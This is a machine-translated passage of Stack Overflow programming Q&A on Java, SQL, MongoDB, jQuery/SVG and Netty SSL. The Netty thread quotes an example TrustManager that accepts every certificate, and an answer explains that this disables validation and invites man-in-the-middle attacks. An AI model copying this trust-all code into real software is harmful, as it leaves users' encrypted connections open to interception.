} 
```

其中哪个更惯用、更易于理解、更易于调试、更易于维护等？

我错过的问题是否有其他解决方案？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-09T13:50:07.263

总是喜欢初始化列表。此外，它还涵盖了可以移动但不能交换的类型，例如，可能必须为默认构造执行昂贵操作的类型，或者实际上根本无法默认构造的类型。

# java - 语法错误——将“double”作为原始类型传递给映射

> ID：11396351
> 
> 赞同：0
> 
> 时间：2012-07-09T13:48:30.633
> 
> 标签：java

所以我找到了大概解析数学表达式并计算答案的源代码。但是，代码在声明新地图时包含语法错误。这个新地图应该包含一个字符串和一个数字。不过，我确实知道地图不能引用原始类型，例如 double。我该如何解决这个问题？

```
private Map<String, double=""> user_var = new HashMap<String, double="">(); 
```

要查看其余代码，可以访问[此处](http://tapas4web.blogspot.com/2011/05/mathematical-expression-parser-in-java.html)

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:52:39.587

您可以将[TObjectDoubleHashMap](http://trove4j.sourceforge.net/javadocs/gnu/trove/map/hash/TObjectDoubleHashMap.html)与允许字符串键和`double`值一起使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T13:50:32.960

这是一个错误的声明。正确的是：

```
private Map<String, Double> user_var = new HashMap<String, Double>(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T13:54:13.327

Java 有*包装类*，允许您在需要 Object 的地方使用原始类型。基本类型 double 的包装类名为 Double。有关详细信息，请参见[此处](http://docs.oracle.com/javase/6/docs/api/index.html?java/lang/Double.html)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-09T13:51:01.630

利用`Map<String, Double> map = new HashMap<String, Double>();`

由于[自动装箱](http://docs.oracle.com/javase/1.5.0/docs/guide/language/autoboxing.html)，您可以像使用它一样使用它

```
map.put("one",1d);
double d = map.get("one"); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-09T13:51:39.890

A`Map`不能包含任何类型的原语。您可以使用包装类创建一个`double`：

```
private Map<String, Double> user_var = new HashMap<String, Double>(); 
```

然后可以（几乎）完全使用它，就好像它包含双打一样：

```
double value = 2.3;
user_var.put("myVar", value); 
```

# sql - MDS 配置管理器

> ID：11396354
> 
> 赞同：0
> 
> 时间：2012-07-09T13:48:40.760
> 
> 标签：sql, sql-server, tsql, sql-server-2012, master-data-services

每次我打开 Master Data Services 配置管理器时，我之前配置的所有选项都是空白的。该服务运行良好，但显然经理没有保存配置。

它应该以这种方式表现还是一个错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T02:57:29.860

在我完成的安装中，这似乎是一个错误。此外，我发现与 DQS 的集成非常不稳定 - 特别是通过 Excel 中的加载项（例如，DQS 加载项并不总是出现或被“禁用”）。

我还在 MSDN 论坛上阅读了一篇关于需要在加入域的机器上安装 MDS 的长帖。该线程似乎已被删除。我在 RC0 和 RTM 位上遇到了这个问题（即安装失败）。

另外 - 这是可能的安装错误[列表](http://msdn.microsoft.com/en-us/library/ff487039%28v=sql.105%29.aspx)。最后，[这是](http://www.bimonkey.com/2012/04/build-your-own-sql-2012-demo-machine-part-4-installing-sql-server-twice/)一个完整的安装，带有另一个已知问题的链接，试图在域控制器上安装 MSD（向下滚动到 MDS 安装部分）

# mysql - MySql order by 与今天的日期相关

> ID：11396355
> 
> 赞同：4
> 
> 时间：2012-07-09T13:48:43.920
> 
> 标签：mysql, sql

我有一个日期列，我正在使用 order by 子句。

我想在顶部显示今天日期附近的记录，然后在底部显示过去的所有记录。

我想用单个查询来做到这一点。

我试过这个

```
SELECT *, DATEDIFF(`date`, CURDATE()) AS diff  FROM `post` order by diff 
```

这个查询的问题是这将首先显示过去的记录，如果我使用降序，那么远离今天的记录将位于顶部。

我怎样才能做到这一点？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-09T13:53:41.147

你应该能够做到这一点：

```
SELECT *, DATEDIFF(`date`, CURDATE()) AS diff  FROM `post`
order by CASE WHEN diff < 0 THEN 1 ELSE 0 END, diff 
```

这将强制过去的任何日期在当前日期或未来日期之后排序。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T13:51:29.250

尝试这个

```
 SELECT *, DATEDIFF(`date`, CURDATE()) AS diff  FROM `post` order by ABS(diff) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T13:50:44.803

你需要`ORDER BY`像这样下降：

```
 SELECT *, DATEDIFF(`date`, CURDATE()) AS diff  
 FROM `post ORDER BY diff DESC; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T13:51:42.067

为什么没有简单的旧日期顺序？

```
 SELECT *, DATEDIFF(`date`, CURDATE()) AS diff  
 FROM `post ORDER BY date DESC; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-09T13:52:05.973

由于您不希望将来的结果太远，因此只需从结果集中删除这些结果：

```
SELECT *, DATEDIFF(`date`, CURDATE()) AS diff FROM `post` 
WHERE `date` < date_add(CURDATE(), INTERVAL 1 DAY)
ORDER BY diff DESC 
```

# mongodb - 在“日志”集合上使用 mapReduce 来生成 HTTP 流

> ID：11396366
> 
> 赞同：1
> 
> 时间：2012-07-09T13:49:24.737
> 
> 标签：mongodb, mapreduce

MongoDB新手问题：

我有很多 HTTP 日志存储到具有以下数据结构的集合中：

```
{
    'client': {
        'ip_address': '1.2.3.4',
        'referrer':"http://....",
        'user_agent':'Mozilla..."
    },
    'request':{
        "stream": "stream1",
        "method": "GET",
        "fragment_id": 97,
        "date": 13482181,
    'response':{
        'status':200,
        'size': 654
    }
} 
```

每个文档都描述了一个 HTTP 请求（从客户端到内容流送器）。由于每个流都被分割成更小的部分，我想在我的集合上使用“mapReduce”，然后创建一个“通用流请求”文档，如下所示：

```
{
    'client_ip': '1.2.3.4',
    'user_agent': 'Mozilla',
    'streams':[
        {
        'stream':"stream1",
        'referrer':'http://...',
        'requests':[
          {
             'fragment_id':97,
             'status':200,
             'date': 13482181,
             'size': 654
             ...
          },
          {
             'fragment_id':98,
             'status':200,
             'date': 13482192,
             'size': 624
             ...
          }, [...]
         ]
        }, [...]
    ] 
```

这是我尝试过的：

```
map = function(){
    emit({client_ip:this.client.ip,user_agent:this.client.user_agent},{
                stream:this.request.stream,
                referrer:this.client.referer,
                status:this.response.status,
                date:this.request.date,
                size:this.response.total_size,
                fragment_id:this.request.fragment_infos[1]
    });
}

reduce = function(key,values){
    r = {'count':0,'request':[]};
    values.forEach(function(v){
        r.count += 1;
        r.request.push(v);
    });

    return r;
} 
```

但这是我得到的结果：

```
"_id" : {
    "client_ip" : "1.2.3.4",
    "user_agent" : "Mozilla\/4.0"
 },
 "value" : {
    "client_ip" : "1.2.3.4",
    "user_agent" : "Mozilla\/4.0",
    "count" : 17,
    "request" : {
        "0" : {
            "client_ip" : "1.2.3.4",
            "user_agent" : "Mozilla\/4.0",
            "count" : 2,
            "request" : {
                "0" : {
                    "stream" : "stream1.isml",
                    "referrer" : null,
                    "status" : 200,
                    "date" : 1341706566,
                    "size" : 456,
                    "fragment_id" : null,
                    "count" : 1
                },
                "1" : {
                    "stream" : "stream1.isml",
                    "referrer" : null,
                    "status" : 200,
                    "date" : 1341706566,
                    "size" : null,
                    "fragment_id" : null,
                    "count" : 1
                }
            }
        },
        "1" : {
            "client_ip" : "1.2.3.4",
            "user_agent" : "Mozilla\/4.0",
            "count" : 3,
            "request" : {
                "0" : {
                    "client_ip" : "1.2.3.4",
                    "user_agent" : "Mozilla\/4.0",
                    "count" : 2,
                    "request" : {
                        "0" : {
                            "stream" : "stream1.isml",
                            "referrer" : null,
                            "status" : 200,
                            "date" : 1341706568,
                            "size" : null,
                            "fragment_id" : null,
                            "count" : 1
......... 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T05:39:31.767

你总是会得到一个包含 _id 和 value 的记录，这是 MongoDB map/reduce 的一个属性。有一张公开票可以改变这种行为： [https ://jira.mongodb.org/browse/SERVER-2517](https://jira.mongodb.org/browse/SERVER-2517)

至于使值与您的示例一致，您希望 map 函数的输出与您希望 reduce 函数的输出形式相同。

```
map = function(){

  emit({client_ip:this.client.ip,user_agent:this.client.user_agent},{
    client_ip: this.client.ip,
    user_agent: this.client.user_agent,
    streams: {
      this.request.stream: {
        referrer: this.client.referer,
        requests: [
          {
            fragment_id: this.request.fragment_infos[1],
            status:this.response.status,
            date:this.request.date,
            size:this.response.total_size  
          }
        ]
      }
    }
  });
} 
```

您需要修改您的 reduce 函数以合并此表单的多个文档。如有必要，编写一个 finalize 函数将流的散列转换为一个流数组，每个元素内都有流名称。

# javascript - 为什么 .html() 不适用于使用 jquery 的 SVG 选择器？

> ID：11396372
> 
> 赞同：16
> 
> 时间：2012-07-09T13:49:40.497
> 
> 标签：javascript, jquery, svg, highcharts, highstock

**有人**可以告诉我如何将我的 SVG 元素转换为字符串吗？

我正在使用[canvg](http://code.google.com/p/canvg/)将我的 SVG 转换为图像。

它必须首先在画布中渲染，该`canvg()`方法需要一个`SVG STRING`

代码 ：

```
 function updateChartImage(){
        canvg(document.getElementById('canvas'),expecting ` svg string`);
       var canvas = document.getElementById("canvas") ; 
       var img = canvas.toDataURL("image/png");
       img = img.replace('data:image/png;base64,', '');
       $("#hfChartImg").val(img) ;
       $('#img').attr({ src: img });
        } 
```

我努力了

```
$('#container svg').html() ; // it gives me an error 
//Uncaught TypeError: Cannot call method 'replace' of undefined 
```

*请注意*

```
 $('#container svg') 
  $('#container').html() // both works fine and 
```

**更新**

我正在使用 highcharts 有一个 getSVG() 函数，我可以将它传递给 canvg() 但问题是它没有得到最新的更新，所以我必须这样做，在运行`getSVG()`函数时我得到了下列的 ： ![在此处输入图像描述](../Images/3f30ed31f55f7383eb6aeeff15c43f60.png)

[关联](http://content.screencast.com/users/minagabriel/folders/Jing/media/ae01e002-0a91-4fa3-a7d0-801eece412e9/2012-07-09_0959.png)

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-07-09T14:56:22.563

据我所知，jQuery`.html()`使用的`innerHTML`是 html，而不是 svg。SVG 是 xml 文档，因此您可以使用`XMLSerializer()`

```
var svg = document.getElementById('svg_root'); // or whatever you call it
var serializer = new XMLSerializer();
var str = serializer.serializeToString(svg); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T08:03:42.897

对于您没有获得 svg 内容的问题，
如果页面上只有一个 svg 图表，则使用：

```
$('svg').html(); 
```

如果超过现在，请查看 highcharts_container 的 div，因为它们创建了 svg 图表。如果你正在使用它们。
然后使用：

```
$('id of that div').html(); 
```

# sql - Postgresql中的递归插入子句

> ID：11396373
> 
> 赞同：0
> 
> 时间：2012-07-09T13:49:49.743
> 
> 标签：sql, postgresql

我想在多行上执行一个大的插入语句，但是递归使得构建正确的 SQL 语句变得困难。我相信一个例子会更容易解释。考虑模型：

**车**

```
|id|代号|型号名称 |
|1 |100 |豪华 |
|10|100 |豪华改进|
|2 |200 |标准 |
|20|200 |标准新 |

```

**颜色**

```
|id|姓名|
|2 |红色 |
|3 |蓝色|

```

**car_colors**

```
|id|car_id|color_id|
|3 |1 |2 |
|4 |2 |2 |
|5 |2 |3 |

```

增加了豪华车，之后又插入了“豪华改进”车型。这是同一辆车的新版本（相同的代码）。不幸的是，John Doe 忘记更新 car_colors 表，所以现在您想通过为每个相同的汽车代码插入相同的颜色来更新该表。

在所考虑的示例中，我们想添加元组“Deluxe Improvement, red”（因为 Deluxe 和 deluxe Improvement 具有相同的代码，Deluxe 是红色的）和元组“standard new, red”和“standard new,黑色”出于同样的原因。

PSEUDO-CODE (non-sql) 应该是这样的： all_cars_and_colors = select * from car left outer join car_colors

```
for each(this_car:all_cars_and_colors){

    if(all_cars_and_colors.color_id does not exist){
        car_colors_to_copy = select * from car inner join car_colors where car.code=this_car.code

        for each(color_to_copy: car_colors_to_copy){
            insert into car_colors(id,car_id,color_id) VALUES (nextval('id_sequence') ,this_car.id,color_to_copy.color_id)
        }

    }
} 
```

**如何使用 SQL 解决这个问题？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:14:01.727

```
-- spoiler
INSERT INTO car_colors (car_id, color_id)
SELECT c1.id
        , co.color_id
FROM car c1
JOIN car c0 ON 1=1
JOIN car_colors co ON co.car_id = c0.id
WHERE c1\. zname = 'Deluxe improved'
AND c0\. zname = 'Deluxe'
        ; 
```

更新：由于要求似乎已经改变，这是一个新的。CTE 到 resque ...

```
DROP TABLE car ;
CREATE TABLE car
        ( id INTEGER NOT NULL PRIMARY KEY
        , zcode integer NOT NULL
        , zname varchar
        );
INSERT INTO car(id, zcode,zname) VALUES
(1 ,100 , 'Deluxe' )
,(10,100 ,'Deluxe improved' )
,(2 ,200 , 'Standard' )
,(20,200 , 'Standard new' )
        ;

DROP TABLE color ;
CREATE TABLE color
        ( id integer NOT NULL PRIMARY KEY
        , zname varchar
        );

INSERT INTO color(id,zname) VALUES
(2 ,'Red' ) , (3 ,'Blue' )
        ;

DROP TABLE car_colors;
CREATE TABLE car_colors
        ( id SERIAL NOT NULL PRIMARY KEY
        , car_id  integer NOT NULL REFERENCES car (id)
        , color_id  integer NOT NULL REFERENCES color (id)
        , UNIQUE (car_id,color_id)
        )
        ;
INSERT INTO car_colors (car_id, color_id) VALUES
  (1,2) , (2,2) , (2,3)
        ;

WITH carmap AS (
        SELECT c0.id AS orgcar
                , c1.id AS newcar
        FROM car c1
        -- This is an ugly join based on a substring
        JOIN car c0 ON c1.zname ~ c0.zname AND c1.id <> c0.id
        )
INSERT INTO car_colors (car_id, color_id)
SELECT cm.newcar
        , co.color_id
FROM carmap cm
JOIN car_colors co ON co.car_id = cm.orgcar
WHERE NOT EXISTS ( SELECT *
        FROM car_colors nx
        WHERE nx.car_id = cm.newcar
        AND nx.color_id = co.color_id
        )
        ; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:12:11.753

我认为您想要的查询如下所示：

```
insert into car_colors(car_id, color_id)
    select <deluxe improved car id>, color_id
    from car_colors
    where car_id = <deluxe car id> 
```

这不处理 id，因为这应该在表级别完成。您应该将 id 列声明为 SERIAL 列。

如果您担心新行重复，请使用：

```
insert into car_colors(car_id, color_id)
    select <deluxe improved car id>, color_id
    from car_colors cc           
    where car_id = <deluxe car id> and
          color_id not in (select color_id from car_colors where car_id = <deluxe improved car id>) 
```

# sql - 从离线数据库添加/更新到中央数据库 - 访问

> ID：11396378
> 
> 赞同：3
> 
> 时间：2012-07-09T13:50:01.007
> 
> 标签：sql, sql-server, ms-access, merge

由于我们的基础设施，我遇到了一个有点独特的问题。我有两个**离线**平板电脑正在执行调查并在 Access 数据库中输入信息。这些平板电脑有自己的数据库前端和后端副本。

我需要在每天结束时使用两个平板电脑数据库中的值更新后端的主副本（在办公室计算机上）。然后将这个主数据库上传到每个平板电脑，替换它们不完整的版本，然后第二天就可以离开了。

我以前从未做过这种合并，也不知道从哪里开始。基本上，我需要一个查询，它将：

*   删除主数据库中的当前值
*   添加来自 tablet1 的值，与 tablet2 的值合并到主数据库中

我可以删除主数据库中的当前值，因为平板电脑也将包含前几天的值（因为有时需要参考等）。基本上，平板电脑将始终包含`entire database + today's survey`. 只是`+ today's survey`每个平板电脑都不同。

有可能吗？我如何保留 ID 字段，因为使用 KeyID 存在关系？

我需要`MERGE`，但没有找到任何关于它是否适用于 MS Access 的文档...... MS 似乎可以随意使用这些标准。或者也许 MSA2010 还没有更新以支持合并？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T15:29:17.560

我找到了一种对我有用的解决方法，可以作为创可贴解决方案。我先清空现有的 Master 表。然后我使用：

```
SELECT * FROM myTable IN "LocationToTablet1/backend_tablet1.mdb"
UNION
SELECT * FROM myTable IN "LocationToTablet2/backend_tablet2.mdb" 
```

并将该查询命名为“myQuery”。然后

```
INSERT INTO myTable IN "LocationToOffice/master_backend.mdb"
SELECT * FROM [myQuery] 
```

然而，对于任何有同样问题的人来说，HansUp 与 SharePoint 集成的解决方案似乎是一个好主意（请参阅问题的评论）。它不需要最终用户干预，而我需要在平板电脑返回办公室时手动调用这些查询。

# android - ActionBarSherlock Omnibus v3.8

> ID：11396385
> 
> 赞同：0
> 
> 时间：2012-07-09T13:50:24.783
> 
> 标签：android, commonsware

我尝试在omnibus v3.8 外部的子文件夹中导入ActionBarSherlock，但出现了很多错误（超过150 个）。其中大多数是关于覆盖超类方法的。

如果我在错误行删除 @Override 注释，错误就消失了。我应该一个一个删除它（超过150个错误）吗？有什么捷径可以消除所有错误吗？

ADT 插件发布：18.0.0 JDK：1.7 构建目标：15

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T16:28:18.423

您导入的源代码来自[http://github.com/commonsware/cw-omnibus](http://github.com/commonsware/cw-omnibus)。如果您阅读该网页，您将找到该代码的使用说明。如果您阅读这些说明，您会发现：

*   您需要将 Java 合规级别设置为 1.6，并且
*   您可能需要调整 ActionBarSherlock 项目以使用您已安装的构建目标进行构建，或安装 API 级别 14（IIRC，这正是 ActionBarSherlock 想要的）

# asp.net-mvc - VS2010在IIS7上部署2个虚拟路径相同的web项目？

> ID：11396388
> 
> 赞同：0
> 
> 时间：2012-07-09T13:50:33.630
> 
> 标签：asp.net-mvc, visual-studio-2010, iis-7, kendo-ui

我有一个作为 JSON 数据提供者运行的 WCF RIA 服务，一个包含 Telerik KendoUI 网格的 MVC4 WebApp 作为托管在本地 IIS7 上的数据容器（带有 GET）。

服务的虚拟路径是/demo

我的小测试 htmlpage 从服务目录中开始加载 JSON 数据并将其显示在网格中。当我想在我的 WebApp 中拥有相同的数据时，数据不会被传递——因为它是另一个域和它的 JSON——而不是 JSONP。

因此，我想出了将 WepApp 添加到 WCF RIA 解决方案的想法，因此具有相同的虚拟路径。但是 VS2010 告诉我“无法创建虚拟目录。该 url 已经映射到不同的文件夹位置。”

有人可以给我一个想法，如何将两个项目“合并”到一个网站中？干杯，马克

# ruby-on-rails - after_sign_in_path 未调用

> ID：11396394
> 
> 赞同：0
> 
> 时间：2012-07-09T13:50:51.553
> 
> 标签：ruby-on-rails, ruby, devise

我有简单的 RoR 应用程序和设计。

这是输出 ot rake 路线

```
logout_index GET    /logout/index(.:format)        logout#index
        new_user_session GET    /users/sign_in(.:format)       devise/sessions#new
            user_session POST   /users/sign_in(.:format)       devise/sessions#create
    destroy_user_session DELETE /users/sign_out(.:format)      devise/sessions#destroy
           user_password POST   /users/password(.:format)      devise/passwords#create
       new_user_password GET    /users/password/new(.:format)  devise/passwords#new
      edit_user_password GET    /users/password/edit(.:format) devise/passwords#edit
                         PUT    /users/password(.:format)      devise/passwords#update
cancel_user_registration GET    /users/cancel(.:format)        devise/registrations#cancel
       user_registration POST   /users(.:format)               devise/registrations#create
   new_user_registration GET    /users/sign_up(.:format)       devise/registrations#new
  edit_user_registration GET    /users/edit(.:format)          devise/registrations#edit
                         PUT    /users(.:format)               devise/registrations#update
                         DELETE /users(.:format)               devise/registrations#destroy 
```

这是 application_controller 中的代码

```
class ApplicationController < ActionController::Base
  protect_from_forgery
  def after_sign_in_path()
      abort 'signed'
   end
end 
```

问题是当用户注册时，方法 after_sign_in_path 没有被执行。我在这里想念什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:58:12.533

我认为应该是`after_sign_in_path_for`。见[这里](http://devise.plataformatec.com.br/#getting-started/configuring-routes)。

# php - php中的图像编辑

> ID：11396401
> 
> 赞同：0
> 
> 时间：2012-07-09T13:51:10.633
> 
> 标签：php, image-processing

我想在我的 Joomla 网站上有一个系统，用户可以在其中上传他们的图像并通过拥有产品模板来创建和设计产品图像。例如钥匙链需要设计。任何人都可以推荐这可能与 PhP 吗？或者我需要一些其他平台来工作。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:57:43.557

这可以通过用于 PHP 的 GD 或 Imagemagick 库来完成。

这是我不久前编写的一个示例脚本，用于使用 PHP 和 imagemagick 将图像合成到空白咖啡杯中。这应该与您尝试执行的操作非常相似。

```
<?php

$im = new Imagick('image.jpg');
$mug = new Imagick('images/mug.png');

$im->scaleImage(300, 0);

$im->setImageFormat('png');
$im->setImageVirtualPixelMethod(Imagick::VIRTUALPIXELMETHOD_TRANSPARENT);
$im->setImageMatte(true);

$height = $im->getImageHeight();

$mug->compositeImage($im, $im->getImageCompose(), 80, 130);

header("Content-Type: image/png");
echo $mug;

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:57:45.290

如果你想为用户提供一种图形编辑器，你很可能需要一个 JavaScript 实现，PHP 只处理它的最终结果。

使用 PHP 编辑图像的一种常见方法是使用[Imagick](http://php.net/manual/en/book.imagick.php)，但您的情况听起来并不像那样。这更适用于需要调整所有上传图像的大小或以不同格式保存它们的情况。

# javascript - 在 IE7/8 中将 excanvas 元素保存为图像

> ID：11396403
> 
> 赞同：2
> 
> 时间：2012-07-09T13:51:22.090
> 
> 标签：javascript, image, screen-scraping, jqplot, excanvas

我正在为 jqPlot 使用 IE7/8 来渲染画布，并且想知道是否可以以 jpg/png 或任何其他格式打印出来。我长期以来一直在努力解决这个问题，我在网上得到的唯一答案是不。是否有任何 javaScript hack 或屏幕抓取工具可以帮助我拍摄画布上呈现的图形的图像。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T11:26:27.253

嗨，有一种方法可以做到这一点 [http://westside-consulting.blogspot.com/2011/05/some-users-of-jqplot-have-expressed.html](http://westside-consulting.blogspot.com/2011/05/some-users-of-jqplot-have-expressed.html) 转到此链接，您将能够打开图像在带有此 var img = $wnd.jQuery('#' + id).jqplotToImage(50, 50); 的新选项卡中 if (img) { open(img.toDataURL("image/jpg")); }

你可以在上面的链接中找到完整的 js，我用 GWT 做到了这一点，我猜在 js 中很容易做到这一点..祝你好运..

# java - Java 类范围和库

> ID：11396409
> 
> 赞同：9
> 
> 时间：2012-07-09T13:51:29.883
> 
> 标签：java, class, package

我正在创建一个 Java 库，作为最终产品，打算将此 .jar 分发给开发人员。

我正在从 Objective-C “翻译”我的库，我在其中控制开发人员可以使用哪些类头文件。换句话说，我只向开发人员展示他们可以处理的几个类。

在我的 Java 库中，我正在使用包并且我的包已经变得非常大。所以我决定把我的模型和控制器分成不同的包。但是现在我想保持私有的模型需要标记为公共才能从主包中使用。

我的问题是这是否违背了我在 Objective-C 中所做的事情？

例如，我有一个 Event 类，它实际上只在内部使用，我不希望用户知道或考虑它。我有另一个类 TimedEvent，用户可以获得一个管理实例。

在我的 Objective-C 中，我只是从库公共范围中排除了 Event 类，允许 TimedEvent。

如果我在我的图书馆里让事情变得更整洁，那么似乎包不是办法。从现在开始，我的主控制器在主包中，所有模型都在另一个包中 - 被迫具有公共范围。

意见？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:07:48.297

这在 Java 中是可能的，但有原因（几乎）没有人这样做......

如果将实现和接口放在同一个包中，则可以省略类和方法中的所有访问修饰符（`private`, `protected`, `public`）以赋予它们“默认”或“包”可见性：仅允许同一包中的类查看/使用它们。

缺点：您必须混合 API 和实现。

另一种方法是将实现移动到一个包`*.private.*`中。不再混合 API 和实现，但恶意用户可以轻松访问实现 - 这只是一个命名约定。就像一个停止标志：它意味着一些东西（“小心”），但实际上并没有阻止你。

最后，您可以在接口内部实现接口。例如：

```
public interface IFoo {
    String getName();

    private static class Foo implements IFoo {
        public String getName();
    }

    public static class FooFactory {
        public static IFoo create() { return new Foo(); }
    }
} 
```

丑陋，不是吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-09T14:12:15.217

控制类向世界公开的常用方法是将实现隐藏在接口和工厂后面。

*   为您创建一个接口，以及一个用于创建接口`TimedEvent`实例的类`TimedEvent`
*   将接口放在主包中，工厂放在子包中
*   让工厂公开可见
*   在子包中实现接口，使其具有包可见性
*   `TimedEvent`在工厂中创建实现接口的类的实例

这是一个如何做到这一点的例子：

```
package com.my.main;
public interface TimedEvent {
    void fire();
}

package com.my.main.events;
import com.my.main;
public class EventFactory {
    public TimedEvent makeTimedEvent() { return new TimedEvent (); }
}
// TimedEventImpl has package visibility - it is not public.
class TimedEventImpl implements TimedEvent {
    public void fire() {
        // Fire a timed event
    }
} 
```

用户将`TimedEvent`像这样访问：

```
com.my.main.events.EventFactory f = new com.my.main.events.EventFactory();
com.my.main.TimedEvent evt = f.makeTimedEvent();
evt.fire(); 
```

# java - Netty SSL：如何编写 TrustManager

> ID：11396412
> 
> 赞同：7
> 
> 时间：2012-07-09T13:51:34.367
> 
> 标签：java, ssl, netty

我已经阅读了很多东西来设置我的 SSL 客户端/服务器系统（没有 HTTP）。

我从[安全聊天示例](https://github.com/netty/netty/tree/3/src/main/java/org/jboss/netty/example/securechat)和[websocket ssl 服务器示例](https://github.com/netty/netty/tree/master/example/src/main/java/io/netty/example/http/websocketx/sslserver)中得到启发。已经使用命令创建了我的 cert.jks 文件

```
keytool -genkey -alias app-keysize 2048 -validity 36500
-keyalg RSA -dname "CN=app"
-keypass mysecret-storepass mysecret
-keystore cert.jks 
```

在安全聊天示例中有这个类：

```
public class SecureChatTrustManagerFactory extends TrustManagerFactorySpi {

    private static final TrustManager DUMMY_TRUST_MANAGER = new X509TrustManager() {
        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

        @Override
        public void checkClientTrusted(
                X509Certificate[] chain, String authType) throws CertificateException {
            // Always trust - it is an example.
            // You should do something in the real world.
            // You will reach here only if you enabled client certificate auth,
            // as described in SecureChatSslContextFactory.
            System.err.println(
                    "UNKNOWN CLIENT CERTIFICATE: " + chain[0].getSubjectDN());
        }

        @Override
        public void checkServerTrusted(
                X509Certificate[] chain, String authType) throws CertificateException {
            // Always trust - it is an example.
            // You should do something in the real world.
            System.err.println(
                    "UNKNOWN SERVER CERTIFICATE: " + chain[0].getSubjectDN());
        }
    };

    public static TrustManager[] getTrustManagers() {
        return new TrustManager[] { DUMMY_TRUST_MANAGER };
    }

    @Override
    protected TrustManager[] engineGetTrustManagers() {
        return getTrustManagers();
    }

    @Override
    protected void engineInit(KeyStore keystore) throws KeyStoreException {
        // Unused
    }

    @Override
    protected void engineInit(ManagerFactoryParameters managerFactoryParameters)
            throws InvalidAlgorithmParameterException {
        // Unused
    }
} 
```

你如何正确地实现这个类？

在这段代码中（在 SecureChatSslContextFactory 类中）：

```
 SSLContext serverContext = null;
    SSLContext clientContext = null;
    try {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(SecureChatKeyStore.asInputStream(),
                SecureChatKeyStore.getKeyStorePassword());

        // Set up key manager factory to use our key store
        KeyManagerFactory kmf = KeyManagerFactory.getInstance(algorithm);
        kmf.init(ks, SecureChatKeyStore.getCertificatePassword());

        // Initialize the SSLContext to work with our key managers.
        serverContext = SSLContext.getInstance(PROTOCOL);
        serverContext.init(kmf.getKeyManagers(), null, null);
    } catch (Exception e) {
        throw new Error(
                "Failed to initialize the server-side SSLContext", e);
    }

    try {
        clientContext = SSLContext.getInstance(PROTOCOL);
        clientContext.init(null, SecureChatTrustManagerFactory.getTrustManagers(), null);
    } catch (Exception e) {
        throw new Error(
                "Failed to initialize the client-side SSLContext", e);
    } 
```

为什么他们把`null`而不是`tmf.getTrustManagers()`在行`serverContext.init(kmf.getKeyManagers(), null, null);`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-09T15:03:40.750

> 你如何正确地实现这个类？

您需要定义一种方法来检查您是否以某种方式信任证书`chain[0]`。如果你不这样做，扔一个`CertificateException`. （这里`SecureChatTrustManagerFactory`从不抛出任何东西，所以它绕过了验证，这会使连接对 MITM 攻击开放。）

如果您想半手动地进行此验证，您可以使用[Java PKI API](http://docs.oracle.com/javase/6/docs/technotes/guides/security/certpath/CertPathProgGuide.html)，尽管[它可能有点乏味](https://stackoverflow.com/a/10414727/372643)，即使在相对简单的用例上也是如此。

一般来说，正确的做法是*不要*实施自己的。将其留给`TrustManagerFactory`（或多或少与使用 完成的方式相同`KeyManagerFactory`）。顺便说一句，在这两种情况下，我都建议使用`Key/TrustManagerFactory.getDefaultAlgorithm()`for 的值`algorithm`，除非你有充分的理由不这样做。它至少比`SunX509`我在许多情况下看到的硬编码的默认值更好（实际上这不是默认的 TMF 算法值）。

`KeyStore`您可以从您自己的信任库（例如，您可以专门为此连接加载的一个实例）初始化 TMF 。

> 为什么他们将 null 而不是 tmf.getTrustManagers() 放在 serverContext.init(kmf.getKeyManagers(), null, null); ?

`null`对于信任管理器和`null`回`SecureRandom`退到默认值。这将是使用默认 TMF 算法（通常`PKIX`）初始化的默认信任管理器，使用默认信任存储（使用 中的位置`javax.net.ssl.trustStore`，或回退到`jssecacerts`文件或`cacerts`）。[JSSE 参考指南](http://docs.oracle.com/javase/7/docs/technotes/guides/security/jsse/JSSERefGuide.html#Customization)中的更多详细信息。

# java - 没有找到适合 add( ) 的方法

> ID：11396416
> 
> 赞同：1
> 
> 时间：2012-07-09T13:51:48.073
> 
> 标签：java, compiler-errors

我正在为一个朋友在 NetBeans 中开发一个 Java 应用程序。这是代码：

```
public class ReportGenerator extends JFrame implements ActionListener {
//GUI components
private JMenuBar menuBar;
private JMenu fileMenu;
private JMenuItem newItem;
    private JMenuItem openItem;
    private JMenuItem exitItem;

private ReportGeneratorSetup setup;
private ReportGeneratorProgram application;

public ReportGenerator()
{
    menuBar = new JMenuBar();
    fileMenu = new JMenu("File");
    fileMenu.setMnemonic(KeyEvent.VK_F);
    exitItem = new JMenuItem("Exit");
    fileMenu.add(exitItem);
    exitItem.addActionListener(this);
    menuBar.add(fileMenu);
